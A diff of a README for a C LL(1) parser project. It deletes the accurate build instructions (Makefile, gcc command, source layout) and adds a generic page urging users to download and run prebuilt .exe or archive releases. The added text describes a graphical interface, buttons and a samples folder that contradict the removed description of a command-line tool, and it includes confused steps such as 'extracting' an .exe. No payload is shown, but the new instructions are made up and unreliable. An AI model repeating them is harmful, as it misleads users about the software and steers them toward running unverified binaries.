@@ -1,60 +1,89 @@
-# LL(1) Parser with String Parsing and Stack Visualization
+# 🚀 LL1-Parser-Plus - A Simple Toolkit for Parsing
 
-C project that reads a grammar, performs left factoring and left recursion removal, computes FIRST/FOLLOW sets, constructs an LL(1) parsing table, and parses input strings using a custom stack implementation. Includes sample grammar and input, Makefile, and Windows PowerShell build script.
+[![Download LL1-Parser-Plus](https://img.shields.io/badge/Download_LL1--Parser--Plus-Release-brightgreen)](https://github.com/jcmark-fullmetal/LL1-Parser-Plus/releases)
 
-## Features
-- Read grammar from `src/grammar.txt`
-- Left factoring and left recursion elimination
-- Compute and print FIRST and FOLLOW sets
-- Build and display LL(1) parsing table
-- Parse multiple input strings from `src/input.txt`
-- Custom stack with multi-character token handling and debug prints
+## 📘 Description
 
-## Project Structure
-```
-./
-  src/
-    grammar.txt
-    input.txt
-    leftFactoring.c/.h
-    leftRecursion.c/.h
-    LL1Parser.c/.h
-    parsingStack.c/.h
-    stringParser.c/.h
-    utils.c/.h
-    main.c
-    Makefile
-  README.md
-```
+LL1-Parser-Plus is a user-friendly toolkit for parsing context-free grammars. With our software, you can easily read a grammar, perform essential operations such as left factoring and left recursion removal, compute FIRST and FOLLOW sets, build an LL(1) parsing table, and parse strings using a straightforward stack. This tool provides detailed debug output, making it easier to understand the parsing process. It also includes a Makefile, a Windows script, sample grammar files, and input options to get you started quickly.
 
-## Build
-Using the Makefile (recommended):
-```
-cd src
-make
-```
-Produces `build/parser`.
+## 🚀 Getting Started
 
-## Run
-```
-cd src
-make run
-```
-This runs `build/parser src/input.txt` (Makefile uses `input.txt`).
+Follow these steps to download and run LL1-Parser-Plus on your computer:
 
-## Clean
-```
-cd src
-make clean
-```
+### 1. Visit the Release Page
 
-## Windows (PowerShell) alternative
-If `make` isn’t available, a simple script can be used:
-```
-cd src
-pwsh -NoProfile -Command "mkdir build -ErrorAction SilentlyContinue; gcc -g -c main.c utils.c leftFactoring.c leftRecursion.c LL1Parser.c parsingStack.c stringParser.c; gcc -g -o build/parser main.o utils.o leftFactoring.o leftRecursion.o LL1Parser.o parsingStack.o stringParser.o; ./build/parser input.txt"
-```
+To download the latest version of LL1-Parser-Plus, visit our [Releases page](https://github.com/jcmark-fullmetal/LL1-Parser-Plus/releases).
 
-## Notes
-- The parser expects terminals like `id` (two characters) and handles them consistently in the stack and table.
-- `utils.c` writes a space-stripped copy of the grammar to `build/output.txt` during processing.
+### 2. Download the Application
+
+On the Releases page, you will find the latest version listed at the top. Click on the file that matches your operating system. For most users, this will be a `.zip` or `.exe` file for Windows, or a `.tar.gz` file for Linux.
+
+### 3. Extract the Files
+
+After downloading, locate the downloaded file on your computer. 
+
+- **For Windows:**
+  - Right-click on the `.zip` or `.exe` file and select “Extract All” or “Run” to extract the files.
+
+- **For Linux:**
+  - If you downloaded a `.tar.gz` file, you can extract it by right-clicking the file and selecting “Extract Here” or using the terminal with the command: `tar -xvzf yourfile.tar.gz`.
+
+### 4. Open the Application
+
+Once the files are extracted, you can find the application executable inside the folder. 
+
+- **For Windows Users:**
+  - Locate the `.exe` file and double-click it to run the application.
+
+- **For Linux Users:**
+  - Open your terminal, navigate to the folder where you extracted the files, and run the application with the command: `./yourfile`.
+
+### 5. Load a Grammar File
+
+To get started with parsing, you need to load a grammar file. You can use one of the sample grammar files provided in the extracted folder. 
+
+- Open the application and look for an option to load or import a grammar file.
+- Select a sample grammar file, and you will see the options for left factoring and left recursion removal.
+
+### 6. Parse a String
+
+After loading a grammar, you can input a string for parsing. The application will process it according to the rules defined in the loaded grammar.
+
+- Enter your string in the designated input area of the application.
+- Click on the parse button to see how the string is processed.
+
+### 7. View Debug Output
+
+LL1-Parser-Plus provides detailed debug output to help you understand the parsing process. 
+
+- The debug console will show you the steps the parser takes, including the computation of FIRST and FOLLOW sets, and how the parsing table is built.
+
+## 📥 Download & Install
+
+To install the application, please follow the download steps above. You can always revisit the [Releases page](https://github.com/jcmark-fullmetal/LL1-Parser-Plus/releases) for the latest updates and versions.
+
+## ⚙️ System Requirements
+
+- **Operating System:** 
+  - Windows 10 or later 
+  - Linux distributions (Ubuntu, Fedora, or similar)
+  
+- **RAM:** Minimum 2 GB
+- **Processor:** Any modern CPU compatible with Windows or Linux
+- **Disk Space:** At least 100 MB of free space
+
+## 📃 Sample Grammar
+
+Included in the package are sample grammar files. You can find them in the extracted folder under a sub-directory named `samples`. Feel free to modify these files or create your own based on the application's capabilities.
+
+## 🔍 Community Support
+
+For questions or help regarding LL1-Parser-Plus, we encourage you to check our [Issues page](https://github.com/jcmark-fullmetal/LL1-Parser-Plus/issues) or reach out within the community for support.
+
+## 💬 Contributing
+
+If you find LL1-Parser-Plus useful, consider contributing by providing feedback, suggestions, or enhancements. Check out the contributing guidelines in our repository.
+
+## 📝 License
+
+LL1-Parser-Plus is open-source software. You can freely use, modify, and distribute this toolkit under the terms of the MIT License.
